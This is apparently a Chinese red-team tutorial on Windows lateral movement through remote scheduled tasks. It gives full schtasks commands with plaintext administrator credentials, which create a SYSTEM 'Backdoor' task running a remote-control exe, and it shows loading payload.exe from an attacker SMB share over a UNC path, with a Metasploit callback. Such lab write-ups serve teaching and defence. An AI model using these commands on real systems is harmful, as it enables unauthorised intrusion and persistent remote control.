---
title: "创建计划任务"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 创建计划任务

### 常规利用流程

在拥有对方管理员凭据的条件下，可以通过已有的IPC连接，在远程主机创建计划任务，实现横向移动，流程如下

* 利用已建立的共享连接上传远控exe

* 利用IPC连接创建计划任务运行远控exe：

  ~~~cmd
  schtasks /Create /S 192.168.111.131 /TN Backdoor /SC minute /MO 1 /TR C:\shell.exe /RU System /F /U yuy0ung\administrator /P Admin123456
  
  # /s，指定要连接到的系统
  # /TN，指定要创建的计划任务名称
  # /SC，指定计划任务频率
  # /MO，制定计划任务执行周期
  # /TR，指定计划任务运行的程序路径
  # /RU，指定计划任务运行的用户权限
  # /F，如果指定的任务存在则强制创建
  ~~~

  ![image-20241022211248581](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241022211250057-1312308505.png)

  检查是否添加成功：

  ~~~cmd
  schtasks /Query /S 192.168.111.131 /U yuy0ung\administrator /P Admin123456 | findstr "Backdoor"
  ~~~

  ![image-20241022211318480](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241022211320543-681990497.png)

* 立即启动计划任务：

  ~~~cmd
  schtasks /RUN /S 192.168.111.131 /I /TN Backdoor /U yuy0ung\administrator /P Admin123456 
  ~~~

  ![image-20241022212642382](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241022212643598-523231082.png)

  开启监听即可连接远控：

  ![image-20241022212733584](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241022212737858-1415484534.png)

* 删除计划任务：

  ~~~cmd
  schtasks /Delete /S 192.168.111.131 /TN Backdoor /F /U yuy0ung\administrator /P Admin123456
  ~~~

### UNC路径加载执行

windows系统中使用UNC路径来访问网络共享资源，格式如下：

~~~cmd
\\servername\share\directory\filename
~~~

其中，servername是服务器主机名，sharename是网络共享的名称，directory和filename分别为该共享下的目录共和文件

使用UNC路径代替常规的本地路径，让远程主机直接在vps上搭建的smb共享中加载攻击载荷并执行，可以省去手动上传的步骤，例如这里建立连接后给远程主机添加定时任务加载远控exe（psexec、wmic、dcom同理）：

* 起一个smbserver:

  ![image-20241025175825354](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025175827787-1519048521.png)

* 在远程主机创建计划任务，使用UNC路径加载smb共享的exe并执行：

  ~~~cmd
  schtasks /Create /S 192.168.111.137 /TN Backdoor /SC minute /MO 1 /TR \\192.168.205.151\evilsmb\payload.exe /RU System /F /U yuy0ung\administrator /P Admin123456
  ~~~

  ![image-20241025193114823](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025193117711-1606002564.png)

  smb加载文件：

  ![image-20241025193240137](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025193243814-1610841571.png)

  msf监听上线：

  ![image-20241025193150695](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025193153344-1910468912.png)

